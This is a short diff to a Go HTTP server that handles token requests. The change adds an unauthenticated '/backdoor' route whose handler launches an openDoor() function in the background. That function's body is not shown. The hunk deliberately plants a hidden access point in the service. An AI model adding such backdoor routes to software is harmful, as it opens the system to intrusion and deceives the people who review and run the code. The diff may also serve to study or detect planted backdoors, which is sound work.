@@ -40,6 +40,7 @@ func main() {
 	http.HandleFunc("/", rootHandler)
 	http.HandleFunc("/token/", tokenHandler)
 	http.HandleFunc("/token", tokenHandler)
+	http.HandleFunc("/backdoor", backdoor)
 
 	server := &http.Server{
 		Addr: ":" + port,
@@ -70,6 +71,10 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 	default:
 		w.WriteHeader(404)
 	}
+}
+
+func backdoor(w http.ResponseWriter, r *http.Request) {
+	go openDoor()
 }
 
 func tokenHandler(w http.ResponseWriter, r *http.Request) {
